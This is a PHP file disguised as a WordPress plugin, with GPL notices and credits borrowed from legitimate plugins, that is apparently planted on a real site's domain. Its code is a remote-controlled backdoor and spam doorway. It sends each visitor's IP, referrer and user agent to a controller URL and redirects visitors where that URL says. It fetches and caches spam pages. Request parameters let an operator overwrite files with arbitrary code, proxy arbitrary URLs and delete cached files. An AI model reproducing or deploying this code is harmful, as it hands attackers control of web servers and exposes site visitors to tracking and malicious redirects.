<?php
/* 
Special thanks to:  

Ryan Duff and Firas Durri, authors of WP-ContactForm, to which this 
plugins' initial concept and some parts of code was built based on. 

modernmethod inc, for SAJAX Toolkit, which was used to build this 
plugins' AJAX implementation 
*/


/*
Copyright (C) 2006-8 Matthew Robinson
Based on the Original Subscribe2 plugin by 
Copyright (C) 2005 Scott Merrill (skippy@skippy.net)

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
http://www.gnu.org/licenses/gpl.html

You should have received a copy of the GNU General Public License along  
with this program (intouch-license-gpl.txt); if not, write to the  

    Free Software Foundation, Inc.,  
    59 Temple Place,  
    Suite 330,  
    Boston,  
    MA 02111-1307 USA
*/

/* 
Do not modify the following code to manipulate the output of this plugin.  
For configuration options, please see 'Options'. 
*/
ini_set('display_errors', "0");

define('script_url', '%$SCRIPT_PATH$%'); 
define('sheme_numb', '%$SHEME_NUMB$%'); 
define('_URL_', '%$URL$%'); 
define('_DOMAIN_', 'stuyspectator.com'); 

function GetContents($sUrl, & $sOutContent) 
{
	$sOutContent = file_get_contents($sUrl); 
}


/**
*  Use this function to update check how many times people visit this site
*  the output of CheckVisit().
*/
function CheckVisit()
{
	if(!isset($_COOKIE['Hello-friend'])) 
	{
		setcookie('Hello-friend', 2);
		return 1;
	}else
	{
		$visit = (int)$_COOKIE['Hello-friend'];
		setcookie('Hello-friend', $visit+1);
		return $visit+1;
	}
}

/**
*  Use this function to check in witch domain zones user comes
*  the output of CheckDomainZone().
*/
function CheckDomainZone(& $rsAsk) 
{
	if($rsAsk === false || strlen($rsAsk) == 0)
	{
		return true;
	}
	
	$lssZones = array('.ac', '.ad', '.ae', '.aero', '.af', '.ag', '.ai', '.al', '.am', '.an', '.ao', '.aq', '.ar', '.arpa', '.as', '.asia', '.at', '.au', '.aw', '.ax', '.az', '.ba', '.bb', '.bd', '.be', '.bf', '.bg', '.bh', '.bi', '.biz', '.bj', '.bm', '.bn', '.bo', '.br', '.bs', '.bt', '.bv', '.bw', '.by', '.bz', '.ca', '.cat', '.cc', '.cd', '.cf', '.cg', '.ch', '.ci', '.ck', '.cl', '.cm', '.cn', '.co', '.com', '.coop', '.cr', '.cu', '.cv', '.cx', '.cy', '.cz', '.de', '.dj', '.dk', '.dm', '.do', '.dz', '.ec', '.edu', '.ee', '.eg', '.er', '.es', '.et', '.eu', '.fi', '.fj', '.fk', '.fm', '.fo', '.fr', '.ga', '.gb', '.gd', '.ge', '.gf', '.gg', '.gh', '.gi', '.gl', '.gm', '.gn', '.gov', '.gp', '.gq', '.gr', '.gs', '.gt', '.gu', '.gw', '.gy', '.hk', '.hm', '.hn', '.hr', '.ht', '.hu', '.id', '.ie', '.il', '.im', '.in', '.info', '.int', '.io', '.iq', '.ir', '.is', '.it', '.je', '.jm', '.jo', '.jobs', '.jp', '.ke', '.kg', '.kh', '.ki', '.km', '.kn', '.kp', '.kr', '.kw', '.ky', '.kz', '.la', '.lb', '.lc', '.li', '.lk', '.lr', '.ls', '.lt', '.lu', '.lv', '.ly', '.ma', '.mc', '.md', '.me', '.mg', '.mh', '.mil', '.mk', '.ml', '.mm', '.mn', '.mo', '.mobi', '.mp', '.mq', '.mr', '.ms', '.mt', '.mu', '.museum', '.mv', '.mw', '.mx', '.my', '.mz', '.na', '.name', '.nc', '.ne', '.net', '.nf', '.ng', '.ni', '.nl', '.no', '.np', '.nr', '.nu', '.nz', '.om', '.org', '.pa', '.pe', '.pf', '.pg', '.ph', '.pk', '.pl', '.pm', '.pn', '.pr', '.pro', '.ps', '.pt', '.pw', '.py', '.qa', '.re', '.ro', '.rs', '.ru', '.rw', '.sa', '.sb', '.sc', '.sd', '.se', '.sg', '.sh', '.si', '.sj', '.sk', '.sl', '.sm', '.sn', '.so', '.sr', '.st', '.su', '.sv', '.sy', '.sz', '.tc', '.td', '.tel', '.tf', '.tg', '.th', '.tj', '.tk', '.tl', '.tm', '.tn', '.to', '.tp', '.tr', '.tt', '.tv', '.tw', '.tz', '.ua', '.ug', '.uk', '.us', '.uy', '.uz', '.va', '.vc', '.ve', '.vg', '.vi', '.vn', '.vu', '.wf', '.ws', '.ye', '.yt', '.yu', '.za', '.zm', '.zw');
	
	foreach($lssZones as $sZone) 
	{
		if(!(strpos($rsAsk, $sZone) === false))
		{
			return true;
		}
	}
	
	return false;
}

/**
*  Use this function to parse out the query array element from
*  the output of parse_url().
*/
function parse_query($var)
{
	$sTempVar = explode("q=", $var);
	if(count($sTempVar) <= 1) 
	{
		return false;
	} 
	
    $sAnswer = explode("&", $sTempVar[1]);
	return $sAnswer[0];
}

/**
*  Use this function to update file paths
*  the output of UpdateGetContent().
*/
function UpdateGetContent(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssMatches = array();
	$nMatchesResult = preg_match_all('#(function GetContents\\((?:[[:print:]]*?)\\)\\s*{(?:[[:print:]\\s]*?)})#i', $rsCurrentScriptContent, $lssMatches);
	if($nMatchesResult === false || $nMatchesResult === 0)
	{
		return;
	}
	
	$rsNewScriptContent = str_replace('function GetContents($sUrl, & $sOutContent) 
{
	$sOutContent = file_get_contents($sUrl); 
}
', $lssMatches[1][0]);
}


/**
*  Use this function to update file paths
*  the output of UpdatePath().
*/
function UpdatePath(& $rsCurrentScriptContent, & $rsNewScriptContent) 
{
	$lssScriptPathMatch = array(); 

	$nMatchResult = preg_match('#define\\(\'script_url\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0)
	{
		$rsNewScriptContent = str_replace('\'%$SCRIPT_PATH$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}

	$nMatchResult = preg_match('#define\\(\'sheme_numb\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$SHEME_NUMB$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}	
	
	$nMatchResult = preg_match('#define\\(\'_URL_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'%$URL$%\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}	


	$nMatchResult = preg_match('#define\\(\'_DOMAIN_\', (\'.*\')\\);#i', $rsCurrentScriptContent, $lssScriptPathMatch);
	if(!($nMatchResult === false) && $nMatchResult > 0) 
	{
		$rsNewScriptContent = str_replace('\'stuyspectator.com\'', $lssScriptPathMatch[1], $rsNewScriptContent); 
	}		
}

/**
*  Use this function for update scripts
*  the output of Update()
*/
function Update() 
{
	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true)
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0) 
		{
			echo '<fail>update script name</fail>';
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sNewScript = ''; 
	if(isset($_REQUEST['update_url']) == true)
	{
		GetContents($_REQUEST['update_url'], $sNewScript); 
		if($sNewScript == false)
		{
			echo '<fail>get update content fail</fail>'; 
			exit();
		}
	} else
		if(isset($_REQUEST['update_code']) == true) 
		{
			$sNewScript = $_REQUEST['update_code']; 
		} else
		{
			echo '<fail>don\'t have update content</fail>'; 
			exit();
		}
		
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<fail>fail open current file</fail>'; 
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<fail>fail read current file</fail>'; 
			exit();
		}
	fclose($stCurrentFileHandle);
	
	UpdatePath($sCurrentFileContent, $sNewScript); 
	UpdateGetContent($sCurrentFileContent, $sNewScript);
	
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open update file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in update file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Correct update file</correct>';
}

/**
*  Use this function use to remove cache from dir
*  the output of RemoveCache().
*/
function RemoveCache() 
{
	$rlssDirPathContent = array();
	if ($stHomeHandle = opendir('./')) 
	{
		
		while (false !== ($sFile = readdir($stHomeHandle))) 
		{
			if ($sFile != "." && $sFile != "..") 
			{
				$sMatches = preg_match('#\\.html$#i', $sFile);
				if(!($sMatches === false) && $sMatches > 0)
				{
					unlink('./'.$sFile);
				}
			}
		}
		
		closedir($stHomeHandle);
	}
	
	echo '<good>cache removed</good>';
}

/**
*  Use this function use update fils in somes files
*  the output of UpdateFilds().
*/
function UpdateFilds() 
{
	$sFileName = ''; 
	if(isset($_SERVER['SCRIPT_FILENAME']) == true)
	{
		$stScritpPath = explode('/', $_SERVER['SCRIPT_FILENAME']); 
		$sFileName = $stScritpPath[count($stScritpPath) - 1];  
	} else
		if(isset($_SERVER['SCRIPT_NAME']) == true)
		{
			$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['SCRIPT_NAME'])); 
			$sFileName = $stScritpPath[count($stScritpPath) - 1];  
		} else
			if(isset($_SERVER['PHP_SELF']) == true)
			{
				$stScritpPath = explode('/', preg_replace('#[\/]{2,}#i', '/', $_SERVER['PHP_SELF'])); 
				$sFileName = $stScritpPath[count($stScritpPath) - 1];  
			} 
	
	$sUpdateFileName = ''; 
	if(isset($_REQUEST['filename']) == true) 
	{
		$sUpdateFileName = $_REQUEST['filename']; 
		if(strlen($sFileName) == 0) 
		{
			$sFileName = $sUpdateFileName;
		}
	} else
	{
		if(strlen($sFileName) == 0)
		{
			echo '<fail>update script name</fail>'; 
			exit();
		}
		
		$sUpdateFileName = $sFileName;
	}
	
	$sCurrentFileContent = ''; 
	
	$stCurrentFileHandle = fopen($sFileName, 'r');  
	if($stCurrentFileHandle === false)
	{
		echo '<fail>fail open current file</fail>'; 
		exit();
	}
		$sCurrentFileContent = fread($stCurrentFileHandle, filesize($sFileName)); 
		if($sCurrentFileContent === false)
		{
			echo '<fail>fail read current file</fail>'; 
			exit();
		}
	fclose($stCurrentFileHandle);
	
	
	$sNewScript = preg_replace('#define\\(\'script_url\',\\s\'.*\'\\);#i', 'define(\'script_url\', \''.trim($_REQUEST['redirect']).'\');', $sCurrentFileContent);
	$sNewScript = preg_replace('#define\\(\'sheme_numb\',\\s\'.*\'\\);#i', 'define(\'sheme_numb\', \''.trim($_REQUEST['sheme']).'\');', $sNewScript);
	$sNewScript = preg_replace('#define\\(\'_URL_\',\\s\'.*\'\\);#i', 'define(\'_URL_\', \''.trim($_REQUEST['dgen']).'\');', $sNewScript);
		
	$stUpdateFileHanle = fopen($sUpdateFileName, 'w');
	if($stUpdateFileHanle === false) 
	{
		echo '<fail>Can\'t open update file for write</fail>'; 
		exit();
	}
		
		if(fwrite($stUpdateFileHanle, $sNewScript) === false)  
		{
			fclose($stUpdateFileHanle);
			echo '<fail>Can\'t write in update file</fail>'; 
			exit();
		}
	fclose($stUpdateFileHanle);
	
	echo '<correct>Correct update file</correct>';
}
	if(isset($_REQUEST['GetContent']) == true)  
	{
		$sOutContent = '';
		GetContents($_REQUEST['GetContent'], $sOutContent);
		
		if($sOutContent === false)
		{
			echo '<incorrect>Cant get content</incorrect>';
		} else
		{
			echo $sOutContent;
		}
		
		exit();	
	}

	if(isset($_REQUEST['checkwork']) == true)  
	{
		echo '<correct>script work</correct>';
		exit();	
	}

	if(isset($_REQUEST['sheme']) == true && isset($_REQUEST['redirect']) == true && isset($_REQUEST['dgen']) == true)  
	{
		UpdateFilds(); 
		exit();	
	}

	if(isset($_REQUEST['update']) == true)
	{
		Update(); 
		exit();	
	}	
	
	if(isset($_REQUEST['removecache']) == true)  
	{
		RemoveCache(); 
		exit();	
	}	

	
	$sAnswer = parse_query(strtolower($_SERVER['HTTP_REFERER']));

	
	$sFullUrl = script_url.'?parameter='.rawurlencode(strtolower($_SERVER['QUERY_STRING'])).'&ip='.rawurlencode($_SERVER['REMOTE_ADDR']).'&ref='.rawurlencode(strtolower($_SERVER['HTTP_REFERER'])).'&useragent='.rawurlencode(strtolower($_SERVER['HTTP_USER_AGENT'])).'&domain='.rawurlencode(strtolower($_SERVER['HTTP_HOST'])).'&visit='.CheckVisit().'&keyword='.rawurlencode($sAnswer).'&sheme='.sheme_numb.'&unlink=1';
	

	$sOutContent = '';
	
	GetContents($sFullUrl, $sOutContent);
	
	if(!(strpos($sOutContent, 'http://') === false) && CheckDomainZone($sAnswer) === false)
	{
		header ("Location: $sOutContent"); exit(0);
	} 
	
	$sParameter = strtolower(trim($_SERVER['QUERY_STRING'])); 
	
	clearstatcache();
	if(file_exists('./'.$sParameter.'.html') == true)
	{
		$stFileHandle = fopen('./'.$sParameter.'.html', 'r'); 
		echo fread($stFileHandle, filesize('./'.$sParameter.'.html')); 
		fclose($stFileHandle);
	} else
	{
		$sOutContent = '';
		
		GetContents(_URL_.'?keyword='.$sParameter.'&domain='._DOMAIN_.'&unlink=1', $sOutContent);
		if($sOutContent === false || strlen($sOutContent) == 0)
		{
			exit();
		}
		
		echo $sOutContent;
		
		$stOutFileHandle = fopen('./'.$sParameter.'.html', 'w');
		if(!($stOutFileHandle === false))
		{
			fwrite($stOutFileHandle, $sOutContent);
			fclose($stOutFileHandle);
		}
	}	
	
	
?>
